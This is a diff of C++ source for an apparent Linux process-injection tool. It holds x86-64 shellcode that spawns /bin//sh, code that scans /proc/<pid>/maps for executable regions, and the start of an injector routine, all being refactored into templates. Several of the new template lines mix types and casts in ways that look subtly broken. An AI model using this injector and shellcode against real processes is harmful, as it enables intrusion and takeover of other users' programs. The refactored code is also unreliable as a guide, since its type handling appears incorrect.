@@ -39,10 +39,10 @@ main:
     00000019  0F05              syscall
 
 */
-const char* __shellcode__ = "\x31\xc0\x48\xbb\xd1\x9d\x96"
-                            "\x91\xd0\x8c\x97\xff\x48\xf7"
-                            "\xdb\x53\x54\x5f\x99\x52\x57"
-                            "\x54\x5e\xb0\x3b\x0f\x05";
+_cchar* __shellcode__ = "\x31\xc0\x48\xbb\xd1\x9d\x96"
+                        "\x91\xd0\x8c\x97\xff\x48\xf7"
+                        "\xdb\x53\x54\x5f\x99\x52\x57"
+                        "\x54\x5e\xb0\x3b\x0f\x05";
 
 std::string max_process_id_file_path = "/proc/sys/kernel/pid_max";
 
@@ -85,7 +85,8 @@ bool SCI::Kernel::retrieve_system_kernel_information() {
   return true;
 }
 
-k55_process SCI::Process::return_maximum_process_id(bool proc) {
+template <class T>
+k55_process SCI::Process<T>::return_maximum_process_id(T proc) {
 
   default_status = n_invalid_var_any;
 
@@ -146,7 +147,8 @@ k55_process SCI::Process::return_maximum_process_id(bool proc) {
   return max_process_id;
 }
 
-char* SCI::Process::return_file_permissions(char* process_line) {
+template <class T>
+T* SCI::Process<T>::return_file_permissions(T* process_line) {
   SCI::extension ext;
   default_status = n_invalid_var_any;
 
@@ -178,7 +180,8 @@ char* SCI::Process::return_file_permissions(char* process_line) {
   return NULL;
 }
 
-long SCI::Parser::retrieve_memory_address(char* line) {
+template <class T>
+long SCI::Parser<T>::retrieve_memory_address(T* line) {
   SCI::extension ext;
   default_status = n_invalid_var_any;
 
@@ -194,7 +197,7 @@ long SCI::Parser::retrieve_memory_address(char* line) {
     return K55_STANDARD_ERROR_CODE;
   }
 
-  char* addrline = new (std::nothrow) char[addr_last_occurance_line_index + 1];
+  T* addrline = new (std::nothrow) char[addr_last_occurance_line_index + 1];
   if (addrline == nullptr) {
     SET_DEBUG_VALUE(default_status, __n_heap_alloc_fatal__);
     std::cerr << "Dynamic Allocation - fatal\n";
@@ -211,24 +214,28 @@ long SCI::Parser::retrieve_memory_address(char* line) {
   return ext.address;
 }
 
-long SCI::Parser::parse_process_id_maps(long target_process_identifier) {
-  SCI::Process proc;
-  SCI::Parser parser;
+template <class T>
+T SCI::Parser<T>::parse_process_id_maps(T target_process_identifier) {
+
+  SCI::Process<char> proc;
+
+  SCI::Parser<char> parser;
+
   SCI::extension ext;
 
   default_status = n_invalid_var_any;
 
   name_length_file = PROCESS_ID_MAX_STRING_LENGTH + 12;
   // Allocate heap space for the file name of the proc map
-  char* maps_file_name = new (std::nothrow) char[name_length_file];
+  T* maps_file_name = reinterpret_cast<long int*> (new (std::nothrow) char[name_length_file]);
   //maps_f_name_path = std::string("/proc/") + std::string(target_process_identifier) + std::string("/maps");
-  if (std::snprintf(maps_file_name, name_length_file, "/proc/%ld/maps", target_process_identifier) < K55_STANDARD_SUCCESS_CODE) {
+  if (std::snprintf(reinterpret_cast<char*>(maps_file_name), name_length_file, "/proc/%ld/maps", target_process_identifier) < K55_STANDARD_SUCCESS_CODE) {
     SET_DEBUG_VALUE(default_status, __n_snprintf_fatal__);
     std::cerr << "snprint() - fatal\n";
     return K55_STANDARD_ERROR_CODE;
   }
 
-  maps_file = fopen(maps_file_name, "r");
+  maps_file = fopen(reinterpret_cast<_cchar*>(maps_file_name), "r");
   if (maps_file == NULL) {
     std::cerr << "File cannot be opened at this time\n";
     return K55_STANDARD_ERROR_CODE;
@@ -236,8 +243,8 @@ long SCI::Parser::parse_process_id_maps(long target_process_identifier) {
 
   std::size_t maps_line_length = 0;
 
-  while (getline(&maps_line, &maps_line_length, maps_file) != -1) {
-    ext.permissions = proc.return_file_permissions(maps_line);
+  while (getline(reinterpret_cast<char**>(&maps_line), &maps_line_length, maps_file) != -1) {
+    ext.permissions = proc.return_file_permissions(reinterpret_cast<char*> (maps_line));
     if (ext.permissions == NULL) {
       //ptruths->non_rxp = true;
       continue;
@@ -250,7 +257,7 @@ long SCI::Parser::parse_process_id_maps(long target_process_identifier) {
     free(ext.permissions);
   }
 
-  ext.address = parser.retrieve_memory_address(maps_line);
+  ext.address = parser.retrieve_memory_address(reinterpret_cast<char*> (maps_line));
   free(maps_line);
 
   return ext.address;
@@ -258,10 +265,12 @@ long SCI::Parser::parse_process_id_maps(long target_process_identifier) {
 }
 
 bool SCI::Injector::proc_inject(long target_process_identifier) {
-  SCI::Process proc;
-  SCI::Kernel kn;
-  SCI::Parser parser;
+
+  SCI::Process<bool> proc;
+  SCI::Parser<long> parser;
+
   SCI::extension ext;
+  SCI::Kernel kn;
 
 
   default_status = n_invalid_var_any;
